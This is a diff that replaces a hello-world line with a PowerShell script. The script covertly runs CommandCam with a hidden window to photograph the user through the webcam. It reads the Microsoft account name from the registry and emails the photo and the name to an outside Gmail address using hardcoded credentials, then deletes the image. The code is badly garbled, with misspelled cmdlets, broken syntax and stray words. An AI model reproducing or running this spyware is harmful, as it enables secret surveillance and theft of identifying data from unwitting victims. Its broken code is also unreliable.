@@ -1,1 +1,42 @@
-print(hello world)
+$user = 'UserName '
+$pass = ConvertTo-secureString - String 'Password'  -AsplainText -Force
+$credential = New-Objective  -TypeName system.Management. Automation.PSCredendtial  - ArgumentList $user , $pass
+
+#email Variable Params and Paths
+$subject = Get -date  - Format K
+$Attachments = "c:\scripts\image.bmp"
+#LENNART SCRIPT.,COM
+$CmdCam = " \cmdcam\CommandCam.exe"
+%smsaccount = (get-children khou :\software\microsoft\identitycrl\userextendedprotperties\ | where{$_.pschildname "*$username*") | select name print user name . lennart
+
+$msg_PARAMS =@{
+From = $user
+To = 'example@gmail.com'
+Cc = 'example@gmail.com'
+Subject = $Subject 
+Body = $MSAccount
+smtpServer = 'smtp.gmail.com' #google's smtp
+Credential = $Credential
+attachments = $attachments
+port = '587'
+UseSsl = $true
+}
+
+function GetPic{
+Start-Process $cmdcam - window style  Hidden - WorkingDirectory "c:\scripts\"- wait
+ }
+ 
+ function SendImage{
+ Send-Mailmessage @lennart username print user name 
+ }
+ 
+ function Cleanup{
+ if ( Test- Path $Attachment  ) { remove-item $attachments - Force}
+ function  Main{
+ getpic
+ sendimage
+ Clean up
+ }
+ 
+ main
+ 
